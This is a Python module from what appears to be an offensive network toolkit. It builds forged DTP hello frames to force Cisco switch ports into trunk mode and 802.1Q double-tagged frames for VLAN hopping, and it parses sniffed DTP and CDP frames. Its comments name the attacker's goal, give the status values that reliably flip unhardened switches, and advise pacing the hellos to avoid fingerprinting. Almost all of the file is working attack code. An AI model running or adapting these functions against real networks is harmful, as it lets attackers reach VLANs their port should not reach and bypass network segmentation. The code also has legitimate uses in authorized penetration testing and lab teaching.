"""VLAN/DTP frame construction and parsing - the area's on-the-wire vocabulary.

Everything here is stateless: values in, fully-built layer-2 frames out; sniffed
frames in, a small parsed record out. Session state (which jobs are running,
what we have observed) lives in
:mod:`~mac_and_seize.modules.lan.vlan.service`.

Two on-the-wire vocabularies are needed for the ``lan vlan`` area:

* **DTP** (Dynamic Trunking Protocol) - Cisco's proprietary protocol that
  negotiates whether a port becomes a trunk. Not an IEEE standard and only ever
  partially documented; the byte-level details below are the ones every public
  DTP tool (Yersinia in particular) has converged on.
* **802.1Q** double-tagging - the (real, standardized) VLAN tag that
  :meth:`~mac_and_seize.modules.lan.vlan.service.VlanService.hop` stacks twice
  on an already-built frame to send it through a trunk into a VLAN the
  attacker's access port has no business reaching.

Frames are built from ``Dot3`` (or ``Ether``) down rather than sent through a
higher-level socket because every attack here forges layer-2 fields the kernel
would otherwise stamp with its own values (a DTP hello must match the local MAC
so the switch accepts it as a neighbor; a double-tagged frame must carry two
raw 802.1Q tags before its IP payload, which no normal socket API will emit).
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any

from scapy.contrib.dtp import (
    DTP,
    DTPDomain,
    DTPNeighbor,
    DTPStatus,
    DTPType,
)
from scapy.layers.l2 import LLC, SNAP, Dot1Q, Dot3, Ether

# --- Multicast destinations --------------------------------------------------

#: DTP is delivered to the Cisco "SSTP" multicast address, shared with CDP,
#: VTP, PAgP, UDLD and a few other Cisco control protocols. Every 802.1D-style
#: switch listens on it and does not forward frames destined here, so a DTP
#: hello stays on the segment it was injected on. A capture filter of
#: ``ether dst 01:00:0c:cc:cc:cc`` is enough to pull every Cisco control-plane
#: frame off the wire, which is what :func:`bpf_control_plane` returns.
CISCO_SSTP_MULTICAST = "01:00:0c:cc:cc:cc"

# --- DTP frame identity ------------------------------------------------------

#: SNAP OUI + protocol code that identify the payload of an LLC/SNAP-framed
#: Cisco control message as DTP. These are what scapy's ``bind_layers(SNAP,
#: DTP, code=0x2004, OUI=0xc)`` binds against (see
#: ``scapy/contrib/dtp.py``); we reference them explicitly so the parser can
#: recognise a DTP frame without depending on scapy's dissector picking it up
#: for us (a same-multicast CDP frame will fail to dissect a DTP layer and
#: needs to be handled specifically).
_DTP_SNAP_OUI = 0x00000C
_DTP_SNAP_CODE = 0x2004

#: SNAP protocol code for CDP. Same OUI as DTP; only used by :func:`parse` to
#: report "CDP frame observed" during ``learn``, since a Native VLAN TLV in a
#: CDP frame is a fine standalone answer to "what is the native VLAN here?"
#: even when no DTP is running.
_CDP_SNAP_CODE = 0x2000

# --- DTP status bytes --------------------------------------------------------
#
# DTP is not an IEEE standard and Cisco has never published a full specification
# of the ``status`` byte semantics. The values below are the ones every public
# implementation (Yersinia, homegrown scapy scripts, various pentest write-ups)
# has converged on and that reliably provoke a peer at ``dynamic auto`` or
# ``dynamic desirable`` into flipping the port to trunk. Bit-by-bit meaning has
# been reverse-engineered several times over with slightly different labellings;
# we treat the byte as an opaque token here and pick between two well-known
# values via the ``--mode`` flag.

#: "Dynamic desirable" - the value Yersinia and scapy's own DTP module default
#: to. Wins against peers at *either* ``dynamic auto`` or ``dynamic desirable``
#: (the two most common defaults on unhardened switches).
DTP_STATUS_DESIRABLE = b"\x03"

#: "Trunk on" (unconditional) - claims the port is already a trunk. Fastest
#: convergence against ``dynamic auto``; still fails against a peer configured
#: ``switchport nonegotiate`` or ``switchport mode access``.
DTP_STATUS_TRUNK = b"\x05"

#: DTP encapsulation-type byte. ``0xa5`` is ISL - kept because it is the value
#: scapy's ``DTPType`` defaults to and the value every public DTP tool sends;
#: modern trunks are almost all 802.1Q on the wire but the type byte is not
#: what a switch checks to decide trunk-vs-access.
_DTP_TYPE_ISL = b"\xa5"

#: DTP hello timer per Cisco documentation. Matching it makes the injected
#: hellos look like a well-behaved neighbor (which is what keeps the port a
#: trunk once we have won the negotiation); sending faster works too but is
#: trivially fingerprint-able as an attacker.
DTP_HELLO_S = 30.0

# --- 802.1Q constraints ------------------------------------------------------

#: Valid VLAN IDs per IEEE 802.1Q. VID 0 means "priority tag, no VLAN" and
#: VID 4095 is reserved for implementation use; neither can appear as a real
#: VLAN membership, so :func:`validate_vlan` rejects both.
VLAN_ID_MIN = 1
VLAN_ID_MAX = 4094

# --- BPF filters -------------------------------------------------------------


def bpf_control_plane() -> str:
    """Return a BPF that catches DTP/CDP/VTP/PAgP frames.

    Used by :meth:`~mac_and_seize.modules.lan.vlan.service.VlanService.learn`
    so the sniffer only pulls Cisco control-plane frames off the segment
    instead of every packet on a busy link.
    """
    return f"ether dst {CISCO_SSTP_MULTICAST}"


def bpf_untagged_dst(target_ip: str) -> str:
    """Return a BPF for outbound, untagged frames destined to ``target_ip``.

    The ``outbound`` primitive is the Linux packet-socket direction flag - we
    only want traffic *this* host is sending, not replies it receives. The
    ``not vlan`` clause is the primary loop guard for the double-tag reinjector
    in :meth:`~mac_and_seize.modules.lan.vlan.service.VlanService.hop`: our own
    reinjected frames already carry an 802.1Q tag, so the sniffer skips them
    at the kernel-BPF layer without a Python round-trip. A defensive
    ``Dot1Q`` check in the reinjector handles the edge case where a driver
    strips the tag into ``PACKET_AUXDATA`` metadata and BPF misses it.
    """
    return f"outbound and ip and dst host {target_ip} and not vlan"


# --- DTP frame building ------------------------------------------------------


def dtp_hello(
    *,
    src_mac: str,
    domain: str = "",
    status: bytes = DTP_STATUS_DESIRABLE,
) -> bytes:
    """Build one DTP hello claiming ``status`` as this port's trunking mode.

    The frame shape is fixed by Cisco: ``Dot3 / LLC(SAP 0xaa) / SNAP(OUI Cisco,
    code 0x2004) / DTP(TLVs)``. Four TLVs are emitted in the order every real
    Cisco device uses (domain, status, type, neighbor). ``src_mac`` is the
    interface's own MAC by design - a switch keys its DTP neighbor state on it
    and expects subsequent hellos to keep the same MAC, so randomising per
    frame (as the STP DoS does) would look like a stream of ghost neighbors
    instead of one persistent one and never establish a trunk.

    ``domain`` is empty by default: an empty VTP domain matches the default
    of a factory-fresh switch, which is what most access-layer ports actually
    run. A real deployment usually has a domain configured, in which case a
    hello with the wrong domain is dropped - :meth:`~mac_and_seize.modules.\
lan.vlan.service.VlanService.learn` reports the observed domain so an operator
    can supply it out-of-band if needed (currently unexposed as an argument;
    can be added if a real target refuses the default).
    """
    domain_field = domain.encode("ascii") if domain else b"\x00"
    frame = (
        Dot3(dst=CISCO_SSTP_MULTICAST, src=src_mac)
        / LLC(dsap=0xAA, ssap=0xAA, ctrl=0x03)
        / SNAP(OUI=_DTP_SNAP_OUI, code=_DTP_SNAP_CODE)
        / DTP(
            ver=1,
            tlvlist=[
                DTPDomain(domain=domain_field),
                DTPStatus(status=status),
                DTPType(dtptype=_DTP_TYPE_ISL),
                DTPNeighbor(neighbor=src_mac),
            ],
        )
    )
    return bytes(frame)


# --- 802.1Q double-tagging ---------------------------------------------------


def double_tag(
    payload,
    *,
    outer_vlan: int,
    inner_vlan: int,
    src_mac: str,
    dst_mac: str,
    outer_prio: int = 0,
    inner_prio: int = 0,
    inner_type: int | None = None,
) -> bytes:
    """Wrap an IP-layer ``payload`` in two stacked 802.1Q tags.

    The outer tag carries ``outer_vlan`` (the *native* VLAN of the trunk this
    frame is meant to cross - the first switch will strip it because the
    frame arrived untagged on an access port assigned to that VLAN; strip is
    what turns a two-tagged frame into a one-tagged frame the second switch
    then delivers into ``inner_vlan``). ``inner_type`` is the EtherType of
    what comes after the inner tag; when ``None`` (the default), scapy fills
    it in from the payload's link-layer class (0x0800 for IP, 0x0806 for ARP,
    etc.) once the frame is built.

    The classic double-tag hop is *strictly one-way*: the frame reaches the
    victim VLAN, but any reply is emitted with the victim VLAN's normal
    egress rules and does not travel back to us through the same trick.
    """
    inner = Dot1Q(vlan=inner_vlan, prio=inner_prio)
    if inner_type is not None:
        inner.type = inner_type
    frame = (
        Ether(src=src_mac, dst=dst_mac)
        / Dot1Q(vlan=outer_vlan, prio=outer_prio)
        / inner
        / payload
    )
    return bytes(frame)


# --- Validation --------------------------------------------------------------


def validate_vlan(value: Any, *, name: str = "VLAN") -> int:
    """Return ``value`` as an integer VLAN id or raise :class:`ValueError`.

    Accepts an int or a numeric string. Bounds are ``VLAN_ID_MIN`` /
    ``VLAN_ID_MAX``: VID 0 (priority tag) and VID 4095 (reserved) are not
    legal VLAN memberships and are rejected here so the calling service can
    stay focused on the attack itself.
    """
    try:
        vlan = int(value)
    except (TypeError, ValueError) as exc:
        raise ValueError(f"{name} must be an integer (got {value!r}).") from exc
    if not (VLAN_ID_MIN <= vlan <= VLAN_ID_MAX):
        raise ValueError(
            f"{name} {vlan} is out of range; expected "
            f"{VLAN_ID_MIN}..{VLAN_ID_MAX} (VID 0 and 4095 are reserved)."
        )
    return vlan


# --- Parsing (for `learn`) ---------------------------------------------------


@dataclass(frozen=True)
class DtpInfo:
    """What we could read out of one DTP hello.

    Fields mirror the four TLVs a Cisco device sends. ``mode_hint`` is a plain
    label ("desirable" / "trunk" / "unknown 0x??") derived from the ``status``
    byte, since the raw byte is the most useful thing to see for someone
    debugging a hop attempt.
    """

    src_mac: str
    domain: str
    status_byte: int
    mode_hint: str
    dtp_type_byte: int
    neighbor_mac: str


def _mode_hint(status_byte: int) -> str:
    """Best-effort label for a DTP status byte value (see the status constants)."""
    if status_byte == DTP_STATUS_DESIRABLE[0]:
        return "desirable"
    if status_byte == DTP_STATUS_TRUNK[0]:
        return "trunk"
    return f"unknown (0x{status_byte:02x})"


def _decode_domain(raw: bytes) -> str:
    """Render a DTP domain TLV value as a printable string."""
    stripped = raw.rstrip(b"\x00")
    if not stripped:
        return ""
    try:
        return stripped.decode("ascii")
    except UnicodeDecodeError:
        return stripped.hex()


def parse_dtp(packet) -> DtpInfo | None:
    """Extract fields from an incoming DTP hello, or ``None`` if not one.

    Only frames carrying a valid ``DTP`` layer are considered; a same-multicast
    CDP/VTP frame that shares the destination MAC returns ``None``.
    """
    if not packet.haslayer(DTP):
        return None
    dtp = packet[DTP]
    src_mac = ""
    if packet.haslayer(Dot3):
        src_mac = str(packet[Dot3].src).lower()
    elif packet.haslayer(Ether):
        src_mac = str(packet[Ether].src).lower()

    domain = ""
    status_byte = 0
    dtp_type_byte = 0
    neighbor_mac = ""
    for tlv in dtp.tlvlist:
        tlv_type = int(getattr(tlv, "type", 0))
        if tlv_type == 1:  # DTPDomain
            domain = _decode_domain(bytes(getattr(tlv, "domain", b"")))
        elif tlv_type == 2:  # DTPStatus
            raw = bytes(getattr(tlv, "status", b""))
            status_byte = raw[0] if raw else 0
        elif tlv_type == 3:  # DTPType
            raw = bytes(getattr(tlv, "dtptype", b""))
            dtp_type_byte = raw[0] if raw else 0
        elif tlv_type == 4:  # DTPNeighbor
            neighbor_mac = str(getattr(tlv, "neighbor", "")).lower()

    return DtpInfo(
        src_mac=src_mac,
        domain=domain,
        status_byte=status_byte,
        mode_hint=_mode_hint(status_byte),
        dtp_type_byte=dtp_type_byte,
        neighbor_mac=neighbor_mac,
    )


def is_cdp(packet) -> bool:
    """True if ``packet`` is Cisco-multicast and carries the CDP SNAP code.

    We don't dissect CDP TLVs (that would need ``scapy.contrib.cdp``, which
    isn't a current dependency); observing that CDP is on the wire at all is
    already useful ``learn`` output, because a CDP-speaking peer will report a
    Native VLAN TLV that an operator can read out with any capture tool.
    """
    if not packet.haslayer(SNAP):
        return False
    snap = packet[SNAP]
    return int(getattr(snap, "OUI", 0)) == _DTP_SNAP_OUI and int(
        getattr(snap, "code", 0)
    ) == _CDP_SNAP_CODE


def observed_vlan(packet) -> int | None:
    """Return the outermost 802.1Q VLAN id on ``packet``, if any.

    Used by ``learn`` to collect the set of VLAN IDs seen on the wire during
    the listen window. Frames without a Dot1Q tag return ``None``.
    """
    if not packet.haslayer(Dot1Q):
        return None
    try:
        return int(packet[Dot1Q].vlan)
    except (AttributeError, TypeError, ValueError):
        return None
